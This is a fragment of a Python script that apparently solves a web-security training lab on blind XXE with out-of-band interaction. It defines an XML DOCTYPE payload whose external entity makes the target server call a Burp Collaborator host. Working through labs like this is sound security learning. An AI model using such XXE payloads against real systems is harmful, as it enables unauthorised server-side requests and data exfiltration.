...
parser = argparse.ArgumentParser(description='Solves the following Lab: Blind XXE with out-of-band interaction')
parser.add_argument('--id', action='store', help='lab ID, ex: 0a6e00ec03ca2e848083672100ee00fb', required=True)
lab = parser.parse_args()

XHEADER = '<?xml version="1.0" encoding="UTF-8"?>' 
dtd = '<!DOCTYPE xxe [ <!ENTITY xxei SYSTEM "http://xxe.burpcollaborator.net/" > ]>'
